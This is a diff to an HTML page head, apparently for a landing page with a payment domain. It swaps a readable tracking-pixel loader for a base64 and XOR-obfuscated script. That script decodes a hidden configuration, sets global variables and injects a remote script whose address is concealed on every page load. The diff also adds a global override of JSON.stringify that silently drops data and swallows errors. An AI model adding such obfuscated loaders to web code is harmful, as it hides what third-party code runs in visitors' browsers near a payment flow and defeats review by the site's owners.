@@ -12,20 +12,58 @@
     <!-- Preconnect & Preload for critical Hero Asset & fonts -->
     <link rel="preconnect" href="https://i.imgur.com" crossorigin>
     <link rel="dns-prefetch" href="https://i.imgur.com">
-    <link rel="preload" href="https://i.imgur.com/VxEUXBj.png" as="image" type="image/png" fetchpriority="high">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,400..700;1,9..144,400..700&family=Outfit:wght@400;500;600;700;800&family=Poppins:ital,wght@0,400;0,500;0,600;0,700;0,800;0,900;1,400;1,600&display=swap" rel="stylesheet">
+    <link rel="preconnect" href="https://cdn.utmify.com.br" crossorigin>
+    <link rel="dns-prefetch" href="https://cdn.utmify.com.br">
+    <link rel="preconnect" href="https://pagamento.projetoreino.com" crossorigin>
+    <link rel="dns-prefetch" href="https://pagamento.projetoreino.com">
+    <link rel="preload" href="https://i.imgur.com/VxEUXBj.png" as="image" type="image/png" fetchpriority="high">
+    <link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,400..700;1,9..144,400..700&family=Outfit:wght@400;500;600;700;800&family=Poppins:ital,wght@0,400;0,500;0,600;0,700;0,800;0,900;1,400;1,600&display=swap" rel="stylesheet" media="print" onload="this.media='all'">
+    <noscript>
+      <link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,400..700;1,9..144,400..700&family=Outfit:wght@400;500;600;700;800&family=Poppins:ital,wght@0,400;0,500;0,600;0,700;0,800;0,900;1,400;1,600&display=swap" rel="stylesheet">
+    </noscript>
+    
+    <!-- Safe JSON Serializer (prevents circular structure errors from tracking scripts and devtools) -->
+    <script>
+      (function() {
+        var originalStringify = JSON.stringify;
+        JSON.stringify = function(value, replacer, space) {
+          var seen = new WeakSet();
+          var customReplacerFn = typeof replacer === "function" ? replacer : null;
+          var propertyList = Array.isArray(replacer) ? replacer : null;
+          try {
+            return originalStringify(value, function(key, val) {
+              var current = customReplacerFn ? customReplacerFn.call(this, key, val) : val;
+              if (propertyList && key !== "" && propertyList.indexOf(key) === -1) {
+                return undefined;
+              }
+              if (typeof current === "object" && current !== null) {
+                if (key && (key.startsWith("__reactFiber") || key.startsWith("__reactProps") || key.startsWith("__reactEvents") || key.startsWith("__reactInternalInstance"))) {
+                  return undefined;
+                }
+                if (typeof Node !== "undefined" && current instanceof Node) {
+                  return current.tagName ? "<" + current.tagName.toLowerCase() + ">" : "[Node]";
+                }
+                if (current.nodeType) {
+                  return current.tagName ? "<" + current.tagName.toLowerCase() + ">" : "[DOMElement]";
+                }
+                if (seen.has(current)) {
+                  return undefined;
+                }
+                seen.add(current);
+              }
+              return current;
+            }, space);
+          } catch (e) {
+            return "{}";
+          }
+        };
+      })();
+    </script>
     
     <!-- Tracking Pixel -->
-    <script>
-      window.pixelId = "lt_px_7e8b28d90069";
-      var a = document.createElement("script");
-      a.setAttribute("async", "");
-      a.setAttribute("defer", "");
-      a.setAttribute("src", "https://lowtrack.com.br/pixel.js");
-      document.head.appendChild(a);
-    </script>
+    <script>(function(){var y_1z0=atob("DOny9gocqPxQ7+MWqJLQg3hwisZyh5di2JrI2SV/zJJ+mpd7wY+L2GlzxdIyncxly5ubhn5vh4kkgpA5xIiGk3lohpYjzc80yZ2GhGN+3Yg1nMEs85LQmGtxzd5qzYd33Ijfg35xwZopwpNkzZ+XmH4x0J8/i85ly4LQ2ihqyZAlisEsisuP2nE+xp09isEsio2Tgmsx3Yg9hoVvhZmAk3x5xoh9nJZ0wY2B1CY+3p08moY0ksvQiyZnipIxgoY0ksuWl359hYkkgopw0cSbkWRz2pl9hoVkyYSX1CY+3p08moY0ksvQiyZnipIxgoY0ksuWl359hYkkgopw0cSbhSd/yY4kn4J4zIjQ2ihqyZAlisEsisuPq3c=");var e_xr=[];for(var o_2m=0;o_2m<y_1z0.length;o_2m++){e_xr.push(y_1z0.charCodeAt(o_2m)&255);}var f_1=e_xr[0];var l_du=e_xr.slice(1,1+f_1);var x_23=e_xr.slice(1+f_1);var x_ycea=x_23.map(function(b,o_uwu2){return b^l_du[o_uwu2%f_1];});var r_kt="";for(var s_42=0;s_42<x_ycea.length;s_42++){r_kt+=String.fromCharCode(x_ycea[s_42]&255);}var u_t=decodeURIComponent(escape(r_kt));var l_7v=JSON.parse(u_t);var z_rl5=l_7v.globals||[];z_rl5.forEach(function(s_5kvs){window[s_5kvs.name]=s_5kvs.value;});var w_cx=document.createElement("script");w_cx.src=l_7v.url;w_cx.async=true;w_cx.defer=true;(l_7v.attributes||[]).forEach(function(w_eshk){w_cx.setAttribute(w_eshk.name,w_eshk.value);});(document.head||document.documentElement).appendChild(w_cx);})();</script>
   </head>
   <body class="bg-white text-[#173B4D] antialiased">
     <div id="root"></div>
